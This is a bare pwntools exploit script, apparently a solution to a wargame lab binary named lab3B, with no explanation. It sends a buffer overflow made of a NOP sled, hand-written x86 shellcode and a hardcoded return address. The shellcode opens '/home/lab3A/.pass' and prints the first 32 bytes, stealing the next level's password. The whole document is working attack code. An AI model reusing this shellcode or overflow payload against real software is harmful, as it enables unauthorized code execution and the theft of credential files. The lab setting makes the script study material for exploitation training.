from pwn import *

shellcode = "\x31\xDB\x31\xC9\xF7\xE3\xB0\x05\x51\x68\x70\x61\x73\x73\x68\x33\x41\x2F\x2E\x68\x2F\x6C\x61\x62\x68\x68\x6F\x6D\x65\x68\x2F\x2F\x2F\x2F\x89\xE3\xCD\x80\x89\xC3\xB0\x03\x89\xE1\xB2\x20\xCD\x80\xB0\x04\xB3\x01\x89\xE1\xB2\x20\xCD\x80\xB0\x01\x31\xDB\xCD\x80"
# len 64 bytes

r = process(["/tmp/transcen/r.sh", "/levels/lab03/lab3B"])
r.sendline("\x90" * 44 + shellcode + "\x90" * 44 + "BBBB" + p32(0xbffff646))
r.interactive()
